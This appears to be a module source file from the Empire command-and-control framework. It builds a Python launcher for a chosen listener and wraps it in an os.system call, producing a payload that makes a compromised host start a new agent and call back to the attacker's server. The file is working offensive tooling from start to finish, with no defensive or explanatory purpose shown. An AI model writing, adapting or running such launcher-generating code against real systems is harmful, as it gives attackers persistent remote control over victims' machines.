from __future__ import print_function

from builtins import object
from builtins import str
from typing import Dict

from empire.server.common.module_models import PydanticModule
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):

        # extract all of our options
        listener_name = params['Listener']
        user_agent = params['UserAgent']

        # generate the launcher code
        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent)

        if launcher == "":
            return handle_error_message("[!] Error in launcher command generation.")
        else:

            launcher = launcher.replace('"', '\\"')
            script = 'import os; os.system("%s")' % (launcher)

            return script
